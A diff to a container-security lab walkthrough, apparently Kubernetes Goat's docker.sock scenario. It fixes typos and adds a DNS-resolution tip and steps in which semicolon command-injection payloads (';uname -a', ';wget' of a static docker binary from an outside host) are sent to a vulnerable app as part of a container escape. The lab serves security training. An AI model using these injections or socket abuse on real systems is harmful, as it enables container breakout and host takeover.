@@ -2,7 +2,7 @@
 
 ## 🙌 Overview
 
-In this scenario, we will be focusing on the common and standard ways how to build systems and pipelines that leverage container sockets to create, build and run containers from underlying container runtime. This has been exploited since the early days of the container ecosystem and till today we see this misconfiguration/use cases in the real world. 
+In this scenario, we will be focusing on the common and standard ways how to build systems and pipelines that leverage container sockets to create, build and run containers from the underlying container runtime. This has been exploited since the early days of the container ecosystem and even today we see these misconfigurations/use cases in the real world. 
 
 ![Scenario 2](images/scenario-2.png)
 
@@ -39,7 +39,7 @@ If you can able to obtain container images in the host system then you have comp
 <details>
   <summary><b>✨ Do you know how to run multiple commands in Linux? </b></summary>
   <div>
-    <div>The application running here has command injection vulnerability. You can exploit this by using the <b>;</b> delimetor when passing the input 🙌</div>
+    <div>The application running here has command injection vulnerability. You can exploit this by using the <b>;</b> delimiter when passing the input 🙌</div>
   </div>
 </details>
 
@@ -53,6 +53,23 @@ If you can able to obtain container images in the host system then you have comp
 ## 🎉 Solution & Walkthrough
 
 ### 🎲 Method 1
+
+* Start by checking that DNS resolution is working for your cluster. If this doesn't work, check to see if you have a DNS service like CoreDNS running on your cluster.
+
+```bash
+www.google.com
+```
+
+:::tip
+* if you get your local domain appended, try using
+
+```bash
+www.google.com.
+```
+
+* If you have to do this, you should always add a . after a url, even in wget commands. The extra dot is required is that kubernetes has a default option of ndots:5 in /etc/resolv.conf, which is verifiable in this scenario. This means that unless a minimum of 5 dots are present, the domain is not assumed to be a FQDN.
+:::
+
 
 * By looking at the application functionality and dabbling with the input and output, we can see it has standard command injection vulnerability. Assuming it's running in a Linux container we can use the `;` delimiter to run/pass other commands
 
@@ -80,7 +97,13 @@ We can use multiple methods for communicating with the `docker.sock` UNIX socket
 
 :::
 
-* We can download the official `docker` static binary from the internet [https://download.docker.com/linux/static/stable/](https://download.docker.com/linux/static/stable/) to the container using the following command 
+* Next we can download the official `docker` static binary from the internet [https://download.docker.com/linux/static/stable/](https://download.docker.com/linux/static/stable/). In order to determine which binary we need, we can run the following command for system discovery
+
+```bash
+;uname -a
+```
+
+* We can examine the output to determine our system architecture and OS, then download the appropriate docker binary to the container. For example, if our target system is a x86\_64 Linux box, we can use the following command
 
 ```bash
 ;wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz -O /tmp/docker-19.03.9.tgz
